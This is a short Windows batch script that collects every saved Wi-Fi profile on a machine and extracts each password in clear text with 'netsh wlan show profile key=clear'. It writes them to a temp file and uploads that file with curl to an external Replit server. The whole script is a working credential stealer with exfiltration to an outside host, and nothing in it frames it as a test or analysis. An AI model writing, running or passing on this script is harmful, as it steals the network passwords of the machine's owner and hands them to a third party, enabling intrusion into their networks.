@echo off
REM Get all Wi-Fi profiles and passwords, then send to a Replit server

REM Set output file
set output=%TEMP%\wifi_passwords.txt

REM Write header to the output file
echo Wi-Fi Password Report > %output%
echo ------------------------------ >> %output%

REM Get all Wi-Fi profiles
for /F "skip=9 tokens=4 delims=: " %%i in ('netsh wlan show profiles') do (
    set "profile=%%i"
    call :getpassword
)

REM Send the output file to the Replit server
curl -X POST -H "Content-Type: text/plain" --data-binary "@%output%" https://21fc98c5-cb70-4f11-95ce-0f6d16fcf8d0-00-329ectptik5ih.picard.replit.dev/

exit

:getpassword
echo Profile: %profile% >> %output%
netsh wlan show profile name="%profile%" key=clear | findstr /R /C:"Key Content" >> %output%
echo. >> %output%
goto :eof
